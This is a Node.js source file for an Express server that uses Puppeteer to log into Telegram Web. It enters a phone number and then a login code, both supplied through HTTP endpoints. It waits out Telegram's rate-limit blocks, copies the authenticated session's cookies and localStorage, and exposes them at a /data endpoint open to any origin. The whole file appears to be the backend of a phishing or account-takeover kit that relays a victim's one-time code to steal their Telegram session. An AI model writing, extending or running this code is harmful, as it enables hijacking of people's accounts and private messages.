const express = require("express")
const cors = require("cors")

let chrome = {}
let puppeteer;

if (process.env.AWS_LAMBDA_FUNCTION_VERSION) {
	chrome = require("chrome-aws-lambda")
	puppeteer = require("puppeteer-core")
}else {
	puppeteer = require('puppeteer');
}


const numbersPage = []
let sessions = null

async function openPhoneReceiveCod(number) {
	let options = {}
	if (process.env.AWS_LAMBDA_FUNCTION_VERSION) {
		options = {
			args: [...chrome.args, "--hide_scrollbars", "disable-web-segurity"],
			defaultViewport: chrome.defaultViewport,
			executablePath: await chrome.executablePath,
			headers: true,
			ignoreHTTPSErrors: true,
		}
	}else {
		options = {
            headless: false,  // Mostrar o navegador localmente
            args: ["--no-sandbox", "--disable-setuid-sandbox"]
        }
	}

	const browser = await puppeteer.launch(options)
	const page = await browser.newPage();
	await page.goto("https://web.telegram.org/k/")
	numbersPage.push({number, page})

	const loginNumber = await page.waitForSelector('.c-ripple', {visible: true})
	await loginNumber.click()

	const inputSelector = "div.input-field.input-field-phone div[contenteditable='true']"
	await page.waitForSelector(inputSelector, {visible: true})
	await page.click(inputSelector)
	await page.type(inputSelector, number)

	const next = await page.waitForSelector('.c-ripple', {visible: true})
	await next.click()

	await page.waitForSelector(".animation-level-2.is-left-column-shown.has-pending-suggestion", { timeout: 3 * 60 * 1000 });

    // Aqui, se o Telegram retornar "flood_wait_884", você pode capturar o erro e aguardar o tempo necessário
    const errorMessage = await page.$eval('.error-message', el => el.textContent);
    if (errorMessage && errorMessage.includes('flood_wait_884')) {
        console.log('Aguarde o bloqueio. Tentando novamente após 14 minutos.');
        await new Promise(resolve => setTimeout(resolve, 14 * 60 * 1000)); // Espera 14 minutos
        return openPhoneReceiveCod(number); // Tenta novamente após o tempo de bloqueio
    }

	await new Promise(res => setTimeout(res, 3*60*1000))
	await browser.close()
}

async function setCod(number, cod) {
	for (const item of numbersPage){
		if (item.number == number) {
			const page = item.page
			const codInput = "input.input-field-input"
			await page.waitForSelector(codInput, {visible: true})
			await page.click(codInput, {delay: 1000})
			await page.type(codInput, cod)
			await page.waitForSelector(".animation-level-2.is-left-column-shown.has-pending-suggestion", {visible: true})
			const cookies = await page.cookies();
			const localStorageData = await page.evaluate(() => {
		    	const data = {};
		    	for (let i = 0; i < localStorage.length; i++) {
		    		const key = localStorage.key(i);
		    		data[key] = localStorage.getItem(key);
		    	}
		    	return data;
		    });
		    sessions = { cookies, localStorage: localStorageData };
			break;
		}
	}
}

app = express()

app.use(cors())

app.get("/phone", (req, res) => {
	const {number} = req.query
	console.log({number})
	openPhoneReceiveCod(number)
	res.send({number})
})

app.get("/cod", (req, res) => {
	const {number, cod} = req.query
	console.log({number, cod})
	setCod(number, cod)
	res.send({cod})
})

app.get("/data", (req, res) => {
	res.json(sessions)
})

app.listen(6050, () => console.log("server ligado"))
